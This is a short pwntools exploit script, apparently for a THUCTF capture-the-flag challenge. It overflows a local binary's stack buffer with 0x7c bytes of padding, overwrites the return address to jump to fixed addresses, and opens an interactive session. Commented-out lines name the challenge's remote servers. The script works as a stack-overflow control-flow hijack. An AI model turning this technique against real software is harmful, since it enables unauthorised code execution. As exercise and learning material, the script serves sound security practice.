from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p=remote("121.37.132.113",10001)

# chal.thuctf.redbud.info:51464
# chal.thuctf.redbud.info:51747
# p=remote("chal.thuctf.redbud.info",51747)

p=process("./main")

# p.send(b'10\n')

addr_ret=0x4011b6

payload=0x7c*b'A'+p64(0x401326)+p64(addr_ret)
# # payload=b'233'
# p.sendafter(b'What\'s your name? \n',payload)

p.sendline(payload)
p.interactive()